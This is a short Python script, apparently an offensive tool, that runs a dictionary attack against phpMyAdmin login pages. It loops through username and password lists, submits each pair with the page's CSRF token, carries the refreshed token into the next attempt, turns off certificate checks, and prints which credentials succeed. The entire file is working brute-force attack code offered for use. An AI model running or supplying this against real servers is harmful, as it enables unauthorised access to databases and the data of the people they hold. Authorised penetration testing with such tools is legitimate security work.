import re, requests, warnings, argparse, sys
warnings.filterwarnings("ignore")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser(
                    prog = 'phpMyAdmin Brute Force',
                    description = 'A simple python script to perform dictionary attack to phpMyAdmin.',
                    epilog = 'Text at the bottom of help')

parser.add_argument('-t', '--target') 
parser.add_argument('-u', '--username')
parser.add_argument('-U', '--usernames-file')
parser.add_argument('-P', '--passwords-file')

args = parser.parse_args()

target = args.target
passwords_file = args.passwords_file

if (args.username != None): users = [args.username]
else: users_file = args.usernames_file

def brute(i,total, username, password, token):
    params = {
        'pma_username': f'{username}',
        'pma_password': f'{password}',
        'server': '1',
        'target': 'index.php',
        'token': f'{token}'
    }
    response = requests.post(target, data=params, verify=False)
    if response.status_code == 200:
        new_token = str(re.search(r'<input type="hidden" name="token" value="(.*?)" /', response.text).group(1))
        if re.search("Access denied", response.text):
            print(bcolors.FAIL + f"[{i}/{total}] Failed: {username} | {password} (Token: {token})" + bcolors.ENDC)
            return new_token
        else:
            print(bcolors.OKGREEN + f"[{i}/{total}] Found: {username} | {password} (Token: {token})" + bcolors.ENDC)
            return new_token

def main():
    token = brute(0,0,"test","test","test")
    print(bcolors.WARNING + f"[*] Got initial token: {token}" + bcolors.ENDC)

    if (args.username == None): 
        with open(users_file) as file: users = [line.rstrip() for line in file]
    with open(passwords_file) as file: passwords = [line.rstrip() for line in file]

    total_combos = len(users) * len(passwords)

    print(bcolors.WARNING + f"[*] Total combinations: {total_combos}" + bcolors.ENDC)
    print(bcolors.WARNING + "[*] Starting :-)" + bcolors.ENDC)

    i=0

    for user in users:
        for password in passwords:
            i+=1
            token = brute(i, total_combos, user, password, token)

if __name__ == '__main__':
    sys.exit(main())